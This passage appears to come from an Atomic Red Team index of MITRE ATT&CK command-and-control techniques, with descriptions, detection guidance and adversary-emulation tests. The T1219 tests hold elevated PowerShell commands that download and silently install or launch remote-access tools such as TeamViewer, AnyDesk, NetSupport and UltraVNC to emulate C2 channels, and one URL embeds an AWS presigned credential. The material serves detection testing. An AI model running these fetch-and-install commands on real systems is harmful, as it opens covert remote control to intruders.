      name: Custom Cryptographic Protocol
      description: |-
        Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.

        Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.

        Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1219:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Matt Kelly, @breakersall
      - Zachary Stanford, @svch0st
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7
      created: '2018-04-18T17:59:24.739Z'
      x_mitre_version: '2.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1219
        url: https://attack.mitre.org/techniques/T1219
      - source_name: CrowdStrike 2015 Global Threat Report
        url: https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf
        description: CrowdStrike Intelligence. (2016). 2015 Global Threat Report.
          Retrieved April 11, 2018.
      - source_name: CrySyS Blog TeamSpy
        url: https://blog.crysys.hu/2013/03/teamspy/
        description: CrySyS Lab. (2013, March 20). TeamSpy â€“ Obshie manevri. Ispolzovatâ€™
          tolko s razreshenija S-a. Retrieved April 11, 2018.
      - source_name: Symantec Living off the Land
        url: https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
        description: Wueest, C., Anand, H. (2017, July). Living off the land and fileless
          attack techniques. Retrieved April 10, 2018.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)

        Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).

        Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)
      modified: '2022-04-21T14:54:10.899Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Remote Access Software
      x_mitre_detection: |-
        Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.

        [Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Process: Process Creation'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1219
    atomic_tests:
    - name: TeamViewer Files Detected Test on Windows
      auto_generated_guid: 8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0
      description: 'An adversary may attempt to trick the user into downloading teamviewer
        and using this to maintain access to the machine. Download of TeamViewer installer
        will be at the destination location when sucessfully executed.

        '
      supported_platforms:
      - windows
      executor:
        command: "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe
          https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 =
          \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process
          -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n"
        cleanup_command: |-
          $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
          if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
          Remove-Item $file1 -ErrorAction Ignore | Out-Null
        name: powershell
        elevation_required: true
    - name: AnyDesk Files Detected Test on Windows
      auto_generated_guid: 6b8b7391-5c0a-4f8c-baee-78d8ce0ce330
      description: 'An adversary may attempt to trick the user into downloading AnyDesk
        and use to establish C2. Download of AnyDesk installer will be at the destination
        location and ran when sucessfully executed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
          Start-Process $file1 /S;
        cleanup_command: |-
          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
          Remove-Item $file1 -ErrorAction Ignore
        name: powershell
        elevation_required: true
    - name: LogMeIn Files Detected Test on Windows
      auto_generated_guid: d03683ec-aae0-42f9-9b4c-534780e0f8e1
      description: 'An adversary may attempt to trick the user into downloading LogMeIn
        and use to establish C2. Download of LogMeIn installer will be at the destination
        location and ran when sucessfully executed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
          Start-Process -Wait $file1 /quiet;
          Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
        cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
          \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
          $file1 -ErrorAction Ignore"
        name: powershell
        elevation_required: true
    - name: GoToAssist Files Detected Test on Windows
      auto_generated_guid: 1b72b3bd-72f8-4b63-a30b-84e91b9c3578
      description: 'An adversary may attempt to trick the user into downloading GoToAssist
        and use to establish C2. Download of GoToAssist installer will be at the destination
        location and ran when sucessfully executed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
          $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
          Start-Process $file1 /S;
        cleanup_command: try{$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1} catch{}
        name: powershell
        elevation_required: true
    - name: ScreenConnect Application Download and Install on Windows
      auto_generated_guid: 4a18cc4e-416f-4966-9a9d-75731c4684c0
      description: |
        An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
        Msiexec will be used to quietly insall ScreenConnect.
      supported_platforms:
      - windows
      executor:
        command: |
          $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
          Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
          msiexec /i $installer /qn
        cleanup_command: |
          $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
          msiexec /x $installer /qn
        name: powershell
        elevation_required: true
    - name: Ammyy Admin Software Execution
      auto_generated_guid: 0ae9e327-3251-465a-a53b-485d4e3f58fa
      description: "An adversary may attempt to trick the user into downloading Ammyy
        Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution,
        Ammyy Admin will be executed. \n"
      supported_platforms:
      - windows
      input_arguments:
        Ammyy_Admin_Path:
          description: Path of Ammyy Admin executable
          type: path
          default: "$env:temp\\ammyy.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})

          '
        prereq_command: 'if (Test-Path #{Ammyy_Admin_Path}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe"
          -OutFile "$env:temp\ammyy.exe" -UseBasicParsing

          '
      executor:
        command: 'Start-Process #{Ammyy_Admin_Path}

          '
        cleanup_command: 'Stop-Process -Name "Ammyy" -force -erroraction silentlycontinue

          '
        name: powershell
        elevation_required: true
    - name: RemotePC Software Execution
      auto_generated_guid: fbff3f1f-b0bf-448e-840f-7e1687affdce
      description: "An adversary may attempt to trick the user into downloading RemotePC
        Software for use as a C2 channel. \nUpon successful execution, RemotePC will
        be executed. \n"
      supported_platforms:
      - windows
      input_arguments:
        RemotePC_Path:
          description: Path of RemotePC executable
          type: path
          default: "$env:temp\\RemotePC.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'RemotePC must exist on disk at the specified location (#{RemotePC_Path})

          '
        prereq_command: 'if (Test-Path #{RemotePC_Path}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe"
          -OutFile "#{RemotePC_Path}" -UseBasicParsing

          '
      executor:
        command: 'Start-Process #{RemotePC_Path}

          '
        cleanup_command: "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False
          -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\"
          -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask
          -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask
          -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue
          \     \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process
          -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process
          -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process
          -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process
          -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process
          -Name \"RPCService\" -force -erroraction silentlycontinue\n"
        name: powershell
        elevation_required: true
    - name: NetSupport - RAT Execution
      auto_generated_guid: ecca999b-e0c8-40e8-8416-ad320b146a75
      description: "A recent trend by threat actors, once a foothold is established,
        maintain long term persistence using third party remote services such as NetSupport
        to provide the operator with access to the network using legitimate services.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        NetSupport_Path:
          description: Path to the NetSupport executable.
          type: path
          default: "$env:temp\\T1219_NetSupport.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'NetSupport must be downloaded and exist on the disk at the specified
          location. (#{NetSupport_Path})

          '
        prereq_command: 'if (Test-Path #{NetSupport_Path}) {exit 0} else {exit 1}

          '
        get_prereq_command: '(New-Object Net.WebClient).DownloadFile("https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe","#{NetSupport_Path}")

          '
      executor:
        command: 'Start-Process #{NetSupport_Path} -ArgumentList "/S /v/qn"

          '
        cleanup_command: 'Stop-Process -Name "client32" -force -erroraction silentlycontinue

          '
        name: powershell
        elevation_required: true
    - name: UltraViewer - RAT Execution
      auto_generated_guid: 19acf63b-55c4-4b6a-8552-00a8865105c8
      description: "A recent trend by threat actors, once a foothold is established,
        maintain long term persistence using third party remote services such as UltraViewer
        to provide the operator with access to the network using legitimate services.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        UltraViewer_Path:
          description: Path to the UltraViewer executable.
          type: path
          default: "$env:temp\\T1219_UltraViewer.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Ultraviewer installer must be downloaded and exist on the disk
          at the specified location. (#{UltraViewer_Path})

          '
        prereq_command: 'if (Test-Path #{UltraViewer_Path}) {exit 0} else {exit 1}

          '
        get_prereq_command: '(New-Object Net.WebClient).DownloadFile("https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe","#{UltraViewer_Path}")

          '
      executor:
        command: |
          Start-Process -Wait -FilePath "#{UltraViewer_Path}" -Argument "/silent" -PassThru
          Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'
        cleanup_command: 'Stop-Process -Name "UltraViewer_Desktop" -Force -ErrorAction
          SilentlyContinue

          '
        name: powershell
        elevation_required: true
    - name: UltraVNC Execution
      auto_generated_guid: 42e51815-a6cc-4c75-b970-3f0ff54b610e
      description: |
        An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.
        Upon successful execution, UltraVNC will be executed.
      supported_platforms:
      - windows
      input_arguments:
        UltraVNC_Viewer_Path:
          description: Path of UltraVNC Viewer executable
          type: path
          default: "$env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'"
      dependency_executor_name: powershell
      dependencies:
      - description: 'UltraVNC must exist at (#{UltraVNC_Viewer_Path})

          '
        prereq_command: 'if (Test-Path #{UltraVNC_Viewer_Path}) {exit 0} else {exit
          1}

          '
        get_prereq_command: |
          Start-BitsTransfer -Source "https://www.uvnc.eu/download/1381/UltraVNC_1_3_81_X64_Setup.exe" -Destination $env:temp\vncsetup.exe -dynamic
          start-process $env:temp\vncsetup.exe /silent
      executor:
        command: 'Start-Process #{UltraVNC_Viewer_Path}

          '
        cleanup_command: 'Stop-Process -Name "vncviewer" -force -erroraction silentlycontinue

          '
        name: powershell
        elevation_required: true
    - name: MSP360 Connect Execution
      auto_generated_guid: b1b8128b-c5d4-4de9-bf70-e60419274562
      description: |
        An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.
        Upon successful execution, MSP360 Connect will be executed.
      supported_platforms:
      - windows
      input_arguments:
        MSP360_Connect_Path:
          description: Path of MSP360 executable
          type: path
          default: "$env:ProgramFiles\\Connect\\Connect.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'MSP360 must exist at (#{MSP360_Connect_Path})

          '
        prereq_command: 'if (Test-Path #{MSP360_Connect_Path}) {exit 0} else {exit
          1}

          '
        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\msp360connect.exe
          \"https://s3.amazonaws.com/cb_setups/_current/cbra/setup.exe?X-Amz-Expires=604800&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA2WIZE3YN7NOSY65U/20230515/us-east-1/s3/aws4_request&X-Amz-Date=20230515T024742Z&X-Amz-SignedHeaders=host&response-content-disposition=attachment;filename=ConnectStandaloneSetup_v3.3.0.15_netv4.5.1_cFA9100C6.exe&X-Amz-Signature=1fe3ddf93f8431b182fac90341f80a4ebf8665ddcc0e36dd385ee20d0ce865c9\"\nstart-process
          $env:temp\\msp360connect.exe /S    \n"
      executor:
        command: 'Start-Process #{MSP360_Connect_Path}

          '
        cleanup_command: 'Stop-Process -Name "Connect" -force -erroraction silentlycontinue

          '
        name: powershell
        elevation_required: true
  T1079:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e
      type: attack-pattern
      created: '2017-05-31T21:31:01.315Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1079
        url: https://attack.mitre.org/techniques/T1079
      - url: http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840
        description: Butler, M. (2013, November). Finding Hidden Threats by Decrypting
          SSL. Retrieved April 5, 2016.
        source_name: SANS Decrypting SSL
      - url: https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html
        description: Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved
          April 5, 2016.
        source_name: SEI SSL Inspection Risks
      - url: https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf
        description: Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for
          a DarkComet. Retrieved April 5, 2016.
        source_name: Fidelis DarkComet
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-24T14:09:11.589Z'
      name: Multilayer Encryption
      description: An adversary performs C2 communications using multiple layers of
        encryption, typically (but not exclusively) tunneling a custom encryption
        scheme within a protocol encryption scheme such as HTTPS or SMTPS.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        If malware uses [Standard Cryptographic Protocol](https://attack.mitre.org/techniques/T1032), SSL/TLS inspection can be used to detect command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks) After SSL/TLS inspection, additional cryptographic analysis may be needed to analyze the second layer of encryption.

        With [Custom Cryptographic Protocol](https://attack.mitre.org/techniques/T1024), if malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1205:
    technique:
      modified: '2022-10-19T23:08:40.603Z'
      name: Traffic Signaling
      description: |-
        Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

        Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

        On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

        Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.

        The Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '2.4'
      x_mitre_contributors:
      - Tony Lee
      - Josh Day, Gigamon
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Process: Process Creation'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_defense_bypassed:
      - Defensive network service scanning
      type: attack-pattern
      id: attack-pattern--451a9977-d255-43c9-b431-66de80130c8c
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1205
        external_id: T1205
      - source_name: Bleeping Computer - Ryuk WoL
        description: Abrams, L. (2021, January 14). Ryuk Ransomware Uses Wake-on-Lan
          To Encrypt Offline Devices. Retrieved February 11, 2021.
        url: https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/
      - source_name: AMD Magic Packet
        description: AMD. (1995, November 1). Magic Packet Technical White Paper.
          Retrieved February 17, 2021.
        url: https://www.amd.com/system/files/TechDocs/20213.pdf
      - source_name: Mandiant - Synful Knock
        description: Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful
          Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.
        url: https://www.mandiant.com/resources/synful-knock-acis
      - source_name: Cisco Synful Knock Evolution
        description: Graham Holmes. (2015, October 8). Evolution of attacks on Cisco
          IOS devices. Retrieved October 19, 2020.
        url: https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices
      - source_name: Hartrell cd00r 2002
        description: 'Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible
          backdoor. Retrieved October 13, 2018.'
        url: https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631
      - source_name: Cisco Blog Legacy Device Attacks
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
      - source_name: GitLab WakeOnLAN
        description: Perry, David. (2020, August 11). WakeOnLAN (WOL). Retrieved February
          17, 2021.
        url: https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1032:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5
      type: attack-pattern
      created: '2017-05-31T21:30:35.334Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1032
        url: https://attack.mitre.org/techniques/T1032
      - url: http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840
        description: Butler, M. (2013, November). Finding Hidden Threats by Decrypting
          SSL. Retrieved April 5, 2016.
        source_name: SANS Decrypting SSL
      - url: https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html
        description: Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved
          April 5, 2016.
        source_name: SEI SSL Inspection Risks
      - url: https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf
        description: Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for
          a DarkComet. Retrieved April 5, 2016.
        source_name: Fidelis DarkComet
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-21T00:43:01.387Z'
      name: Standard Cryptographic Protocol
      description: Adversaries may explicitly employ a known encryption algorithm
        to conceal command and control traffic rather than relying on any inherent
        protections provided by a communication protocol. Despite the use of a secure
        algorithm, these implementations may be vulnerable to reverse engineering
        if necessary secret keys are encoded and/or generated within malware samples/configuration
        files.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks)

        If malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1572:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b
      type: attack-pattern
      created: '2020-03-15T16:03:39.082Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1572
        url: https://attack.mitre.org/techniques/T1572
      - source_name: SSH Tunneling
        url: https://www.ssh.com/ssh/tunneling
        description: SSH.COM. (n.d.). SSH tunnel. Retrieved March 15, 2020.
      - source_name: BleepingComp Godlua JUL19
        url: https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/
        description: Gatlan, S. (2019, July 3). New Godlua Malware Evades Traffic
          Monitoring via DNS over HTTPS. Retrieved March 15, 2020.
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-27T17:15:35.372Z'
      name: Protocol Tunneling
      description: "Adversaries may tunnel network communications to and from a victim
        system within a separate protocol to avoid detection/network filtering and/or
        enable access to otherwise unreachable systems. Tunneling involves explicitly
        encapsulating a protocol within another. This behavior may conceal malicious
        traffic by blending in with existing traffic and/or provide an outer layer
        of encryption (similar to a VPN). Tunneling could also enable routing of network
        packets that would otherwise not reach their intended destination, such as
        SMB, RDP, or other traffic that would be filtered by network appliances or
        not routed over the Internet. \n\nThere are various means to encapsulate a
        protocol within another protocol. For example, adversaries may perform SSH
        tunneling (also known as SSH port forwarding), which involves forwarding arbitrary
        data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol
        Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by
